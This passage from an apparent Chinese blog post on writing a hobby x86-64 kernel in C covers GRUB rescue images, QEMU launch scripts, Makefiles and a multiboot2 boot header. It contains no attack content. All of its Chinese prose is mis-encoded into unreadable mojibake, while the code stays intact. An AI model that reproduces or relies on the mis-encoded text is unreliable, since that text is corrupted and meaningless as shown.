è¿›è¡Œè°ƒè¯•</li></ul><p>ç®€å•æµ‹è¯•ä¸€ä¸‹ï¼ŒæˆåŠŸè¿›å…¥ GRUB ç•Œé¢ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129040935.png"></p><blockquote><p>å¦‚æœæœªæŒ‡å®š <code>-bios</code> å‚æ•°ï¼Œåˆ™é»˜è®¤ä¼šä½¿ç”¨ SeaBIOS è¿›è¡Œå¯åŠ¨ï¼Œæ­¤æ—¶ä¾¿æ˜¯ä¼ ç»Ÿçš„ BIOS + MBR å¯åŠ¨æ–¹å¼ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129041009.png"></p></blockquote><p>ä¸è¿‡å¯èƒ½ä¹Ÿæœ‰åŒå­¦æ‰‹ä¸Šæš‚æ—¶æ²¡æœ‰é—²ç½®çš„ U ç›˜æˆ–å…¶ä»–å¤–éƒ¨å­˜å‚¨è®¾å¤‡ï¼Œæ­¤æ—¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>grub-mkrescue</code> åˆ›å»ºä¸€ä¸ªä¸“é—¨ç”¨æ¥è°ƒè¯•çš„é•œåƒï¼Œé¦–å…ˆåˆ›å»ºå¦‚ä¸‹ç›®å½•ç»“æ„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree target/</span><br>target/<br>â””â”€â”€ x86_64<br>    â””â”€â”€ iso<br>        â””â”€â”€ boot<br>            â””â”€â”€ grub<br>                â””â”€â”€ grub.cfg<br><br>4 directories, 1 file<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä½¿ç”¨  <code>grub-mkrescue</code> åˆ›å»ºé•œåƒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">grub-mkrescue /usr/lib/grub/x86_64-efi -o kernel.iso target/x86_64/iso</span><br></code></pre></td></tr></table></figure><p>æŠŠå¯åŠ¨è„šæœ¬ä¸­çš„è®¾å¤‡èŠ‚ç‚¹è·¯å¾„æ”¹æˆæ–‡ä»¶è·¯å¾„å³å¯æˆåŠŸå¯åŠ¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>qemu-system-x86_64 \<br>-bios /usr/share/ovmf/OVMF.fd \<br>-cpu kvm64,+smep,+smap \<br>-smp sockets=1,dies=1,cores=4,threads=2 \<br>-m 4G \<br>--machine q35 \<br>-drive file=./kernel.iso,format=raw,index=0,media=disk<br></code></pre></td></tr></table></figure><h1 id="0x03-å¯åŠ¨ä¸€ä¸ªç©ºç™½å†…æ ¸"><a href="#0x03-å¯åŠ¨ä¸€ä¸ªç©ºç™½å†…æ ¸" class="headerlink" title="0x03. å¯åŠ¨ä¸€ä¸ªç©ºç™½å†…æ ¸"></a>0x03. å¯åŠ¨ä¸€ä¸ªç©ºç™½å†…æ ¸</h1><p>æ¥ä¸‹æ¥æˆ‘ä»¬ç»ˆäºè¦æ­£å¼å¼€å§‹è¿›è¡Œå†…æ ¸çš„ç¼–å†™äº†ï¼Œè¿‡å»ç»å¤§éƒ¨åˆ†çš„æ“ä½œç³»ç»Ÿå†…æ ¸éƒ½æ˜¯ç”¨ <code>æ±‡ç¼– + C è¯­è¨€</code> ç¼–å†™çš„ï¼Œä¸è¿‡æœ€è¿‘ä¹Ÿæœ‰ä½¿ç”¨ Rust æ›¿æ¢ C è¯­è¨€çš„å†…æ ¸å®ç°ï¼ˆä¾‹å¦‚å›½äº§æ“ä½œç³»ç»Ÿ <a href="https://dragonos.org/">DragonOS</a> ï¼Œ<strong>ä¸ç»å¤§å¤šæ•° Linux ç³»ç»Ÿè°ƒç”¨å…¼å®¹ï¼Œç›®å‰å·²ç»å®Œæˆäº† musl-gcc çš„ç§»æ¤</strong>ï¼Œç¬”è€…è§‰å¾—éå¸¸ğŸ‚ğŸºï¼‰ï¼ŒRust ä¹Ÿåœ¨é€æ¸è¿›å…¥ Linux å†…æ ¸ï¼ŒåŒ…æ‹¬<a href="https://os.educg.net/#/">è®¡ç®—æœºç³»ç»Ÿèƒ½åŠ›å¤§èµ›</a> ä¸»æ¨çš„ä¹Ÿæ˜¯ Rust å†…æ ¸</p><p>ä½†æ˜¯å¯¹äºæ–°æ‰‹è€Œè¨€ Rust ç»ˆå½’æ˜¯æœ‰äº›éš¾ä»¥è®©äººç»·å¾—ä½ï¼Œåœ¨ç¬”è€…çœ‹æ¥<strong>ä¸èƒ½åƒ C è¯­è¨€é‚£æ ·æä¾›è¶³å¤Ÿè´´è¿‘äºç¡¬ä»¶åº•å±‚çš„ç›´æ¥æŠ½è±¡</strong>ï¼Œå› æ­¤ç¬”è€…è¿™é‡Œè¿˜æ˜¯å…ˆé€‰æ‹©è‡ªå·±æœ€å–œæ¬¢çš„ C è¯­è¨€æ¥è¿›è¡Œå†…æ ¸çš„ç¼–å†™ï¼šï¼‰</p><blockquote><p>ç®—ä¸‹æ¥å·²ç»æ˜¯ç¬”è€…ç”¨ C å†™çš„ç¬¬å››ä¸ªå†…æ ¸äº†ï¼Œå¸Œæœ›è¿™æ¬¡èƒ½å¤Ÿè¾¾åˆ°æ¯”è¾ƒé«˜çš„ä¸€ä¸ªå®Œæˆåº¦</p></blockquote><h2 id="ä»£ç åŸºæœ¬ç»“æ„"><a href="#ä»£ç åŸºæœ¬ç»“æ„" class="headerlink" title="ä»£ç åŸºæœ¬ç»“æ„"></a>ä»£ç åŸºæœ¬ç»“æ„</h2><p>æœ€åˆçš„ä»£ç ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼ŒåŒ…å«ä¸€ä¸ªç©ºç™½å†…æ ¸ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree .</span><br>.<br>â”œâ”€â”€ code<br>â”‚Â Â  â”œâ”€â”€ arch<br>â”‚Â Â  â”‚Â Â  â”œâ”€â”€ Makefile<br>â”‚Â Â  â”‚Â Â  â””â”€â”€ x86<br>â”‚Â Â  â”‚Â Â      â”œâ”€â”€ boot<br>â”‚Â Â  â”‚Â Â      â”‚Â Â  â”œâ”€â”€ boot_main.c<br>â”‚Â Â  â”‚Â Â      â”‚Â Â  â”œâ”€â”€ boot.S<br>â”‚Â Â  â”‚Â Â      â”‚Â Â  â”œâ”€â”€ boot_tty.c<br>â”‚Â Â  â”‚Â Â      â”‚Â Â  â””â”€â”€ font.psf<br>â”‚Â Â  â”‚Â Â      â”œâ”€â”€ include<br>â”‚Â Â  â”‚Â Â      â”‚Â Â  â””â”€â”€ asm<br>â”‚Â Â  â”‚Â Â      â”‚Â Â      â”œâ”€â”€ cpu_types.h<br>â”‚Â Â  â”‚Â Â      â”‚Â Â      â””â”€â”€ page_types.h<br>â”‚Â Â  â”‚Â Â      â””â”€â”€ Makefile<br>â”‚Â Â  â”œâ”€â”€ include<br>â”‚Â Â  â”‚Â Â  â”œâ”€â”€ boot<br>â”‚Â Â  â”‚Â Â  â”‚Â Â  â””â”€â”€ multiboot2.h<br>â”‚Â Â  â”‚Â Â  â”œâ”€â”€ closureos<br>â”‚Â Â  â”‚Â Â  â”‚Â Â  â””â”€â”€ types.h<br>â”‚Â Â  â”‚Â Â  â””â”€â”€ graphics<br>â”‚Â Â  â”‚Â Â      â””â”€â”€ font<br>â”‚Â Â  â”‚Â Â          â””â”€â”€ psf.h<br>â”‚Â Â  â”œâ”€â”€ kernel<br>â”‚Â Â  â”‚Â Â  â”œâ”€â”€ main.c<br>â”‚Â Â  â”‚Â Â  â””â”€â”€ Makefile<br>â”‚Â Â  â”œâ”€â”€ linker.ld<br>â”‚Â Â  â””â”€â”€ Makefile<br>â”œâ”€â”€ repack_iso.sh<br>â”œâ”€â”€ run.sh<br>â””â”€â”€ target<br>    â””â”€â”€ x86_64<br>        â””â”€â”€ iso<br>            â””â”€â”€ boot<br>                â””â”€â”€ grub<br>                    â””â”€â”€ grub.cfg<br><br>17 directories, 18 files<br><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä½¿ç”¨ <code>Make</code> æ¥è¿›è¡Œé¡¹ç›®ç®¡ç†ï¼Œæ ¹ç›®å½•çš„ <code>Makefile</code> ç¼–å†™å¦‚ä¸‹ï¼Œä¸»è¦ä½œç”¨å°±æ˜¯å‡†å¤‡ç»Ÿä¸€çš„ç¼–è¯‘å‚æ•°ã€è¿›å…¥ä¸åŒæ–‡ä»¶å¤¹è¿›è¡Œ makeã€é“¾æ¥æ‰€æœ‰çš„ç›®æ ‡æ–‡ä»¶ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># Author: arttnba3</span><br><span class="hljs-comment"># 2023.11</span><br><br>CC:= <span class="hljs-variable">$(GCCPREFIX)</span>gcc<br>AS:= <span class="hljs-variable">$(GCCPREFIX)</span>as<br>AR:= <span class="hljs-variable">$(GCCPREFIX)</span>ar<br>LD:= <span class="hljs-variable">$(GCCPREFIX)</span>ld<br>CFLAGS := -pipe -ffreestanding -nostdlib -fno-pie -fno-stack-protector -mcmodel=large<br>LDFLAGS := -nostdlib -z max-page-size=0x1000<br><br><span class="hljs-keyword">export</span> CC<br><span class="hljs-keyword">export</span> AS<br><span class="hljs-keyword">export</span> AR<br><span class="hljs-keyword">export</span> LD<br><span class="hljs-keyword">export</span> CFLAGS<br><br>INCLUDE := <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span>/<span class="hljs-keyword">include</span>/<br>ARCH := <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> uname -m)</span><br>OUT := <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span>/out/<br>ARCH_OUT := <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span>/out/arch/<br><br><span class="hljs-keyword">export</span> INCLUDE<br><span class="hljs-keyword">export</span> ARCH<br><span class="hljs-keyword">export</span> OUT<br><span class="hljs-keyword">export</span> ARCH_OUT<br><br><span class="hljs-section">all: prepare kernel.bin</span><br><br><span class="hljs-section">prepare:</span><br>mkdir -p <span class="hljs-variable">$(OUT)</span><br>mkdir -p <span class="hljs-variable">$(ARCH_OUT)</span><br><br><span class="hljs-section">kernel.bin: kernel_file arch_file</span><br><span class="hljs-variable">$(LD)</span> -T linker.ld -o <span class="hljs-variable">$(OUT)</span>/<span class="hljs-variable">$@</span> <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> find <span class="hljs-variable">$(OUT)</span> -name *.o)</span><br><br><span class="hljs-section">kernel_file:</span><br>make -C kernel/<br><br><span class="hljs-section">arch_file:</span><br>make -C arch/<br><br><span class="hljs-section">clean:</span><br>rm -rf ./out<br><br><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: all</span><br><br></code></pre></td></tr></table></figure><p><code>include</code> ç›®å½•ä¸‹æ˜¯ç”¨äºå„ä¸ªå­ç³»ç»Ÿçš„å„ç§å¤´æ–‡ä»¶ï¼Œä¸ multiboot2 è§„èŒƒç›¸å…³çš„ä¸€äº›å®šä¹‰æ”¾åœ¨ <code>include/boot/multiboot2.h</code> ä¸­ï¼Œè¯¥å¤´æ–‡ä»¶æ¥è‡ªäº<a href="https://www.gnu.org/software/grub/manual/multiboot2/html_node/multiboot2_002eh.html">Multiboot 2 spec</a>ï¼Œæ¯”è¾ƒé•¿ï¼Œè¿™é‡Œå°±ä¸è´´å‡ºæ¥äº†</p><p>å†…æ ¸ä¸»ä½“æ”¾åœ¨ <code>kernel</code> ç›®å½•ä¸‹ï¼Œå…¶ä¸­ <code>kernel/Makefile</code> ç¼–å†™å¦‚ä¸‹ï¼Œä¸»è¦å°±æ˜¯ç¼–è¯‘å®Œæ”¾åˆ°è¾“å‡ºæ–‡ä»¶å¤¹ä¸­ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs makefile">src_files = <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> *.c)</span><br>obj_files = <span class="hljs-variable">$(<span class="hljs-built_in">notdir</span> $(<span class="hljs-built_in">patsubst</span> %c, %o, <span class="hljs-variable">$(src_files)</span>)</span>)<br><br><span class="hljs-section">all:</span><br><span class="hljs-variable">$(CC)</span> <span class="hljs-variable">$(CFLAGS)</span> -c <span class="hljs-variable">$(src_files)</span> -I <span class="hljs-variable">$(INCLUDE)</span><br>mkdir <span class="hljs-variable">$(OUT)</span>/kernel<br>mv <span class="hljs-variable">$(obj_files)</span> -t <span class="hljs-variable">$(OUT)</span>/kernel<br></code></pre></td></tr></table></figure><p><code>kernel/main.c</code> æš‚æ—¶å°±å…ˆæ”¾ä¸€ä¸ªç©ºçš„å‡½æ•°ï¼Œ <em>æœ¬ç¯‡åšå®¢æš‚æ—¶è¿˜ç”¨ä¸åˆ°è¿™å—</em> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">// do nothing</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>arch</code> ç›®å½•ä¸‹æ˜¯ä¸æ¶æ„ç›¸å…³çš„ä»£ç ï¼Œç›®å‰æš‚æ—¶è¿˜æ˜¯åªæ”¯æŒ x86ï¼Œä¸è¿‡åç»­å¦‚æœæœ‰æœºä¼šçš„è¯ç¬”è€…å¸Œæœ›èƒ½å¤Ÿè®©ä»–åœ¨æ›´å¤šæ¶æ„ä¸Šè·‘èµ·æ¥ï¼Œæ‰€ä»¥è¿™é‡Œè®¾è®¡äº†ä¸€ä¸ªé€šç”¨çš„ <code>arch/Makefile</code>ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">all:</span><br><span class="hljs-keyword">ifeq</span> (<span class="hljs-variable">$(ARCH)</span>,x86_64)<br>make -C x86/<br><span class="hljs-keyword">else</span><br>@echo <span class="hljs-string">&quot;unsupported arch&quot;</span><br>@false<br><span class="hljs-keyword">endif</span><br></code></pre></td></tr></table></figure><p><code>arch/x86/Makefile</code> ä¸»è¦å°±æ˜¯ç¼–è¯‘æ±‡ç¼–å’Œ C æ–‡ä»¶ä»¥åŠå¯åŠ¨é˜¶æ®µä¸´æ—¶ç”¨çš„å­—ä½“æ–‡ä»¶æ”¾åˆ° <code>out/arch</code> ç›®å½•ä¸‹ï¼Œè¿™é‡Œæˆ‘ä»¬å°†å¯åŠ¨é˜¶æ®µæ‰€éœ€çš„ä»£ç éƒ½æ”¾åœ¨ <code>arch/x86/boot</code> ç›®å½•ä¸‹ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># Author: arttnba3</span><br><span class="hljs-comment"># 2023.11</span><br><br>boot_dir = boot<br>X86_INCLUDE = <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span>/<span class="hljs-keyword">include</span>/<br><br>src_asm = <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> *.S)</span><br>src_asm += <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> <span class="hljs-variable">$(boot_dir)</span>/*.S)</span><br><br>src_c = <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> *.c)</span><br>src_c += <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> <span class="hljs-variable">$(boot_dir)</span>/*.c)</span><br><br>src_files = <span class="hljs-variable">$(src_asm)</span><br>src_files += <span class="hljs-variable">$(src_c)</span><br><br>obj_files = <span class="hljs-variable">$(<span class="hljs-built_in">notdir</span> $(<span class="hljs-built_in">patsubst</span> %S, %o, <span class="hljs-variable">$(src_asm)</span>)</span>)<br>obj_files += <span class="hljs-variable">$(<span class="hljs-built_in">notdir</span> $(<span class="hljs-built_in">patsubst</span> %c, %o, <span class="hljs-variable">$(src_c)</span>)</span>)<br>obj_files += boot_font.o<br><br><span class="hljs-section">all: <span class="hljs-variable">$(src_files)</span></span><br><span class="hljs-variable">$(CC)</span> <span class="hljs-variable">$(CFLAGS)</span> -c <span class="hljs-variable">$(src_files)</span> -I <span class="hljs-variable">$(INCLUDE)</span> -I <span class="hljs-variable">$(X86_INCLUDE)</span><br>objcopy -O elf64-x86-64 -B i386 -I binary <span class="hljs-variable">$(boot_dir)</span>/font.psf boot_font.o<br>mv <span class="hljs-variable">$(obj_files)</span> -t <span class="hljs-variable">$(ARCH_OUT)</span><br><br></code></pre></td></tr></table></figure><h2 id="boot-Sï¼šBIOS-amp-UEFI-å…¼å®¹-32-ä½æ±‡ç¼–å…¥å£ï¼Œè·³è½¬è¿›å…¥-64-ä½-C-è¯­è¨€"><a href="#boot-Sï¼šBIOS-amp-UEFI-å…¼å®¹-32-ä½æ±‡ç¼–å…¥å£ï¼Œè·³è½¬è¿›å…¥-64-ä½-C-è¯­è¨€" class="headerlink" title="boot.Sï¼šBIOS &amp; UEFI å…¼å®¹ 32 ä½æ±‡ç¼–å…¥å£ï¼Œè·³è½¬è¿›å…¥ 64 ä½ C è¯­è¨€"></a>boot.Sï¼šBIOS &amp; UEFI å…¼å®¹ 32 ä½æ±‡ç¼–å…¥å£ï¼Œè·³è½¬è¿›å…¥ 64 ä½ C è¯­è¨€</h2><p><code>arch/x86/boot.S</code> ä¸­åˆ™æ˜¯æˆ‘ä»¬å®é™…çš„å†…æ ¸å…¥å£ç‚¹ï¼Œæˆ‘ä»¬çš„ multiboot2 header ä¹Ÿå¯ä»¥æ”¾åœ¨è¿™ä¸ªåœ°æ–¹ï¼Œè¿™é‡Œé™¤äº†æœ€åŸºæœ¬çš„ç»“æ„ä»¥å¤–ç¬”è€…è¿˜å¼•å…¥äº†ä¸€ä¸ªæŒ‡ç¤ºå…¥å£ç‚¹çš„ tagï¼Œä»¥åŠä¸€ä¸ªæŒ‡ç¤ºè®© GRUB å¸®æˆ‘ä»¬è®¾ç½®å¥½æŒ‡å®šå¤§å°çš„ frame buffer çš„ tagï¼ŒGRUB2 ä¼šæ ¹æ®è¿™ä¸ª tag è‡ªåŠ¨å¸®æˆ‘ä»¬è®¾ç½®æ˜¾ç¤ºæ¨¡å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#define ASM_FILE 1<br>#include &lt;boot/multiboot2.h&gt;<br>#include &lt;asm/cpu_types.h&gt;<br>#include &lt;asm/page_types.h&gt;<br><br>#define GRUB_MULTIBOOT_ARCHITECTURE_I386 (0)<br>#define MULTIBOOT2_HEADER_LEN (multiboot_header_end - multiboot_header)<br>#define MULTIBOOT2_HEADER_CHECKSUM \<br>    -(MULTIBOOT2_HEADER_MAGIC \<br>    + GRUB_MULTIBOOT_ARCHITECTURE_I386 \<br>    + MULTIBOOT2_HEADER_LEN)<br><br>.section .boot.header<br>    .align 8<br><br>    multiboot_header:<br>        .long   MULTIBOOT2_HEADER_MAGIC<br>        .long   GRUB_MULTIBOOT_ARCHITECTURE_I386<br>        .long   MULTIBOOT2_HEADER_LEN<br>        .long   MULTIBOOT2_HEADER_CHECKSUM<br><br>    tag_entry:<br>        .align 8<br>        .short MULTIBOOT_HEADER_TAG_ENTRY_ADDRESS<br>        .short 0<br>        .long 12<br>        .long _start<br>    <br>    tag_frame_buffer:<br>        .align 8<br>        .short MULTIBOOT_HEADER_TAG_FRAMEBUFFER<br>        .short 0<br>        .long 20<br>        .long 1024<br>        .long 768<br>        .long 32<br><br>    tags_end:<br>        .align 8<br>        .short  MULTIBOOT_HEADER_TAG_END<br>        .short  0<br>        .long   8<br>    multiboot_header_end:<br></code></pre></td></tr></table></figure><p>ELF æ–‡ä»¶é»˜è®¤çš„å…¥å£ç‚¹æ˜¯ <code>_start</code> å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜ä¸€ä¸ª <code>_start</code> å‡½æ•°å¹¶å¯¼å‡ºè¯¥ç¬¦å·ï¼Œä»è€Œä½¿å¾— GRUB åœ¨å®Œæˆå†…æ ¸çš„è£…è½½ä¹‹åä¼šä»æ­¤å¤„å¼€å§‹æ‰§è¡Œï¼Œä¸è¿‡æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡åœ¨ header ä¸­æ·»åŠ ä¸€ä¸ª <code>entry address tag</code> æ¥ä¸º GRUB æŒ‡å®šæˆ‘ä»¬çš„å†…æ ¸å…¥å£ç‚¹ï¼š</p><p>ä¸è¿‡åœ¨æ­£å¼å¼€å§‹ä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆçœ‹çœ‹å½“å‰çš„æœºå™¨çŠ¶æ€ï¼Œè¿™é‡Œç¬”è€…æ‰“ç®—<strong>åŒæ—¶å…¼å®¹ Legacy BIOS å¯åŠ¨ä¸ UEFI å¯åŠ¨</strong>ï¼Œå› æ­¤è¿™ä¸¤ç§æœºå™¨çŠ¶æ€æˆ‘ä»¬éƒ½å¾—çœ‹çœ‹å¦‚ä½•å¤„ç†</p><h3 id="â‘ -Legacy-BIOS-å¯åŠ¨"><a href="#â‘ -Legacy-BIOS-å¯åŠ¨" class="headerlink" title="â‘  Legacy BIOS å¯åŠ¨"></a>â‘  Legacy BIOS å¯åŠ¨</h3><p>å½“æˆ‘ä»¬ä½¿ç”¨ Legay BIOS å¯åŠ¨éµå¾ª Multiboot2 è§„èŒƒçš„ 32 ä½å†…æ ¸æ—¶ï¼Œåœ¨è¿›å…¥å†…æ ¸æ—¶æœºå™¨åº”å½“æœ‰å¦‚ä¸‹<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Machine-state">çŠ¶æ€</a>ï¼š</p><ul><li><code>eax</code>ï¼šå¿…å®šä¸º Magic Number <code>0x36d76289</code>ï¼Œè¯¥å€¼çš„å­˜åœ¨è¡¨æ˜å…¶ä¸ºç¬¦åˆ multiboot2 æ ‡å‡†çš„å¼•å¯¼ç¨‹åºåŠ è½½çš„</li><li><code>ebx</code>ï¼šå¿…å®šä¸ºå¼•å¯¼åŠ è½½ç¨‹åºæä¾›çš„ Multiboot2 ä¿¡æ¯ç»“æ„çš„ 32 ä½ç‰©ç†åœ°å€ï¼ˆå‚è§<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Boot-information-format">è¿™é‡Œ</a>ï¼‰</li><li><code>cs</code>ï¼šæƒé™ä¸º <code>è¯»|æ‰§è¡Œ</code>ï¼Œåç§»ä¸º <code>0</code>ï¼Œç•Œé™ä¸º <code>0xFFFFFFFF</code></li><li><code>dsã€esã€fsã€gsã€ss</code>ï¼šæƒé™ä¸º <code>è¯»|å†™</code>ï¼Œåç§»ä¸º <code>0</code>ï¼Œç•Œé™ä¸º <code>0xFFFFFFFF</code></li><li><code>A20 gate</code>ï¼šå·²å¼€å¯</li><li><code>cr0</code>ï¼šåˆ†é¡µï¼ˆPGï¼‰å…³é—­ï¼Œä¿æŠ¤æ¨¡å¼ï¼ˆPEï¼‰å¼€å¯</li><li><code>eflags</code>ï¼šVMã€IF ä¸¤ä¸ªä½æ¸…ç©º</li></ul><p>å‰©ä¸‹çš„å·¥ä½œéƒ½éœ€è¦æˆ‘ä»¬çš„å†…æ ¸è‡ªè¡Œå®Œæˆï¼ŒåŒ…æ‹¬æ®µæè¿°ç¬¦è¡¨çš„è®¾ç½®ã€å †æ ˆã€ä¸­æ–­æè¿°ç¬¦è¡¨çš„è®¾ç½®ç­‰</p><h3 id="â‘¡-UEFI-å¯åŠ¨"><a href="#â‘¡-UEFI-å¯åŠ¨" class="headerlink" title="â‘¡ UEFI å¯åŠ¨"></a>â‘¡ UEFI å¯åŠ¨</h3><p>å½“æˆ‘ä»¬ä½¿ç”¨ UEFI å¯åŠ¨éµå¾ª Multiboot2 è§„èŒƒçš„ 32 ä½å†…æ ¸æ—¶ï¼Œåœ¨è¿›å…¥å†…æ ¸æ—¶æœºå™¨åº”å½“æœ‰å¦‚ä¸‹<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Machine-state">çŠ¶æ€</a>ï¼š</p><ul><li><code>eax</code>ï¼šå¿…å®šä¸º Magic Number <code>0x36d76289</code>ï¼Œè¯¥å€¼çš„å­˜åœ¨è¡¨æ˜å…¶ä¸ºç¬¦åˆ multiboot2 æ ‡å‡†çš„å¼•å¯¼ç¨‹åºåŠ è½½çš„</li><li><code>ebx</code>ï¼šå¿…å®šä¸ºå¼•å¯¼åŠ è½½ç¨‹åºæä¾›çš„ Multiboot2 ä¿¡æ¯ç»“æ„çš„ 32 ä½ç‰©ç†åœ°å€</li></ul><p>æ ¹æ® <a href="https://uefi.org/sites/default/files/resources/UEFI%20Spec%202_6.pdf">UEFI è§„èŒƒ v2.6</a> ç¬¬ 2.3.2 èŠ‚ï¼Œæ­¤æ—¶æœºå™¨æœ‰å¦‚ä¸‹çŠ¶æ€ï¼š</p><ul><li>å•å¤„ç†å™¨æ¨¡å¼ï¼ˆUniprocessorï¼Œä»…æœ‰ä¸€ä¸ªæ ¸å¿ƒè¢«å”¤é†’ï¼Œå‚è§ <a 